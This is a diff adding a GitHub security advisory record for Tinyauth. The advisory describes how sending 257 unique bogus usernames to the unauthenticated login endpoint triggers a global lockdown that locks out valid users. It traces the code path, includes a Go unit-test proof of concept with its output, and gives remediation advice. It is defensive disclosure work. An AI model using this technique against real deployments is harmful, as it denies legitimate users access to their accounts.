@@ -1,0 +1,69 @@
+{
+  "id": "GHSA-9xhm-w3wj-xhqh",
+  "modified": "2026-09-22T21:00:05.788556720Z",
+  "published": "2026-09-22T20:37:11Z",
+  "aliases": [
+    "CVE-2026-77561"
+  ],
+  "summary": "Tinyauth: Unauthenticated login attempts can trigger global login lockdown denial of service",
+  "details": "### Summary\n\nTinyauth's login rate-limit bookkeeping can enter a global lockdown mode when its in-memory login-attempt map reaches 256 distinct identifiers. Because unauthenticated `POST /api/user/login` requests for unknown usernames are recorded in this same map, a remote unauthenticated attacker can submit 257 unique bogus usernames and cause valid credentials for unrelated users to be treated as locked until `auth.loginTimeout` expires.\n\nThis was confirmed against the stable `v5.0.7` release. With default configuration, `auth.loginTimeout` is 300 seconds and `auth.loginMaxRetries` is 3, so the denial lasts about 5 minutes and can be repeated.\n\n### Details\n\nIn stable `v5.0.7`, the login endpoint is registered at `internal/controller/user_controller.go:45` and accepts unauthenticated JSON credentials in `loginHandler` at `internal/controller/user_controller.go:50`. Before validating credentials, it calls `controller.auth.IsAccountLocked(req.Username)` at `internal/controller/user_controller.go:65`.\n\nWhen a username does not exist, the login handler records a failed login attempt for the attacker-controlled username with `controller.auth.RecordLoginAttempt(req.Username, false)` at `internal/controller/user_controller.go:83`. Invalid passwords for existing users do the same at `internal/controller/user_controller.go:94`.\n\nThe rate-limit map has a hard cap of 256 records at `internal/service/auth_service.go:29`. `RecordLoginAttempt` checks `len(auth.loginAttempts) \u003e= MaxLoginAttemptRecords` at `internal/service/auth_service.go:261` and, once the cap is reached, launches `auth.lockdownMode()` at `internal/service/auth_service.go:265` instead of evicting old identifiers or rejecting only the new identifier.\n\n`lockdownMode` sets a global `auth.lockdown` value with `Active: true` and `ActiveUntil: now + auth.config.LoginTimeout` at `internal/service/auth_service.go:790-804`. `IsAccountLocked` checks this global lockdown before looking up the requested identifier at `internal/service/auth_service.go:227-234`, so every username is treated as locked while the global lockdown is active.\n\nThe default configuration enables this path with `LoginTimeout: 300` and `LoginMaxRetries: 3` at `internal/config/config.go:23-24`.\n\nSource-to-sink path:\n\n```text\nUnauthenticated POST /api/user/login JSON username\n  -\u003e loginHandler binds LoginRequest\n  -\u003e unknown username path records RecordLoginAttempt(attacker-chosen username, false)\n  -\u003e 257 unique identifiers fill loginAttempts beyond MaxLoginAttemptRecords\n  -\u003e RecordLoginAttempt starts lockdownMode()\n  -\u003e lockdownMode sets global auth.lockdown.Active = true\n  -\u003e IsAccountLocked returns locked for unrelated valid users\n  -\u003e login endpoint returns HTTP 429 for valid credentials until loginTimeout expires\n```\n\nCandidate score: 13/14. Reachability 2, attacker control 2, privilege required 2, sink impact 1, mitigation weakness 2, default exposure 2, safe reproduction feasibility 2.\n\n### PoC\n\nThis PoC is local and non-destructive. It was tested against stable tag `v5.0.7`. It proves that 257 distinct unknown-user identifiers trigger global lockdown for an unrelated valid user, while that user's password still verifies successfully.\n\n1. Check out stable `v5.0.7`.\n\n2. Create `internal/service/login_lockdown_stable_poc_test.go`:\n\n```go\npackage service\n\nimport (\n    \"fmt\"\n    \"testing\"\n    \"time\"\n\n    \"github.com/steveiliop56/tinyauth/internal/config\"\n    \"github.com/steveiliop56/tinyauth/internal/utils/tlog\"\n    \"github.com/stretchr/testify/require\"\n)\n\nfunc TestPoCStableUnknownUsersTriggerGlobalLoginLockdown(t *testing.T) {\n    tlog.NewTestLogger().Init()\n\n    authServiceCfg := AuthServiceConfig{\n        Users: []config.User{{\n            Username: \"testuser\",\n            Password: \"$2a$10$ZwVYQH07JX2zq7Fjkt3gU.BjwvvwPeli4OqOno04RQIv0P7usBrXa\", // password\n        }},\n        LoginTimeout:    2,\n        LoginMaxRetries: 3,\n    }\n\n    authService := NewAuthService(authServiceCfg, \u0026DockerService{}, \u0026LdapService{}, nil, nil)\n    t.Cleanup(authService.ClearRateLimitsTestingOnly)\n\n    require.True(t, authService.VerifyUser(config.UserSearch{\n        Username: \"testuser\",\n        Type:     \"local\",\n    }, \"password\"))\n\n    for i := 0; i \u003c= MaxLoginAttemptRecords; i++ {\n        authService.RecordLoginAttempt(fmt.Sprintf(\"attacker-%03d\", i), false)\n    }\n\n    require.Eventually(t, func() bool {\n        locked, _ := authService.IsAccountLocked(\"testuser\")\n        return locked\n    }, time.Second, 10*time.Millisecond)\n\n    locked, remaining := authService.IsAccountLocked(\"testuser\")\n    require.True(t, locked)\n    require.GreaterOrEqual(t, remaining, 0)\n\n    require.True(t, authService.VerifyUser(config.UserSearch{\n        Username: \"testuser\",\n        Type:     \"local\",\n    }, \"password\"))\n\n    t.Logf(\"proof on v5.0.7: %d distinct failed unknown-user identifiers caused unrelated valid user testuser to be locked\", MaxLoginAttemptRecords+1)\n}\n```\n\n3. Run:\n\n```bash\ngo test ./internal/service -run 'TestPoCStableUnknownUsersTriggerGlobalLoginLockdown' -count=1 -v\n```\n\nObserved output from this environment:\n\n```text\n=== RUN   TestPoCStableUnknownUsersTriggerGlobalLoginLockdown\nauth_service.go:798: Multiple login attempts detected, possibly DDOS attack. Activating temporary lockdown.\n    login_lockdown_stable_poc_test.go:42: proof on v5.0.7: 257 distinct failed unknown-user identifiers caused unrelated valid user testuser to be locked\n--- PASS: TestPoCStableUnknownUsersTriggerGlobalLoginLockdown (0.10s)\nPASS\nok      github.com/steveiliop56/tinyauth/internal/service    0.111s\n```\n\n4. Cleanup:\n\n```bash\nrm internal/service/login_lockdown_stable_poc_test.go\n```\n\n### Impact\n\nA remote unauthenticated attacker who can reach Tinyauth's login endpoint can temporarily deny login for unrelated valid users by sending a small number of login attempts using unique nonexistent usernames.\n\nWith default configuration, the global lockdown lasts 300 seconds. The attack does not invalidate existing sessions, but users who need to log in during the lockdown window receive rate-limit responses even when providing valid credentials.\n\nThis affects availability of local login and any flow that depends on the same account-lock check. The issue is especially relevant for internet-exposed Tinyauth deployments where `/api/user/login` is reachable.\n\nSuggested remediation: do not enter global lockdown because of attacker-controlled unknown usernames. Use bounded LRU eviction for old login-attempt records instead of global lockout; consider rate limiting by client IP plus normalized username; avoid counting unlimited nonexistent usernames toward a global security state. If a global safety mode is desired, require stronger signals such as source-based thresholds rather than only distinct username count.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/steveiliop56/tinyauth",
+        "purl": "pkg:golang/github.com/steveiliop56/tinyauth"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.1-0.20260715123057-dade1e2c8f27"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-9xhm-w3wj-xhqh/GHSA-9xhm-w3wj-xhqh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/security/advisories/GHSA-9xhm-w3wj-xhqh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-77561"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/pull/1008"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/pull/943"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/commit/654b5cc436fc67865c1f55edf9ba9fbded50b74f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/commit/dade1e2c8f27a23df56ac216dcaf4b37081698e7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tinyauthapp/tinyauth"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tinyauthapp/tinyauth/releases/tag/v5.1.0"
+    }
+  ]
+}
